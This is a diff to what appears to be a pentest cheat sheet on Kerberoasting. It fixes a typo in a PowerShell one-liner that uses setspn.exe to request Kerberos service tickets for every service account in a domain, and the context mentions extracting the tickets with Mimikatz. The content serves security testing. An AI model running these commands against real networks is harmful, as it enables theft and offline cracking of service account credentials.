@@ -20,7 +20,7 @@ PS C:\> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -A
 All the tickets
 ```
 PS C:\> Add-Type -AssemblyName System.IdentityModel  
-PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System. IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
+PS C:\> setspn.exe -T medin.local -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }  
 ```
 
 Extract the acquired tickets from ram with Mimikatz
